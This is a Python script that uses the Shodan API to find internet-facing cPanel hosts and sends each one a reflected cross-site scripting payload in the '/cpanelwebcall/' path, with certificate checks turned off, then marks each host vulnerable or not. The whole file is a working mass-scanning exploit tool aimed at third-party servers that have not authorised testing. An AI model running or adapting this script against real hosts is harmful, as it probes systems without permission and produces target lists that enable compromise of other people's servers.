import shodan
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

SHODAN_API_KEY = 'API_KEY_HERE'

def search_cpanel_hosts(api_key):
    api = shodan.Shodan(api_key)
    query = 'cpanel'
    results = api.search(query)

    for result in results['matches']:
        yield result['ip_str'], result['http']['host']

def test_xss(url):
    xss_url = urljoin(url, '/cpanelwebcall/<img%20src=x%20onerror="prompt(1)">aaaaaaaaaaaa')
    
    # Disable SSL certificate validation
    response = requests.get(xss_url, verify=False)
    
    soup = BeautifulSoup(response.text, 'html.parser')
    img_tags = soup.find_all('img', src='x')

    for img_tag in img_tags:
        if 'onerror' in img_tag.attrs and img_tag['onerror'] == 'prompt(1)':
            return True
    return False


if __name__ == '__main__':
    for ip, host in search_cpanel_hosts(SHODAN_API_KEY):
        url = f'http://{host}'
        print(f'Checking: {url}')
        if test_xss(url):
            print(f'[Vulnerable] {url}')
        else:
            print(f'[Not Vulnerable] {url}')
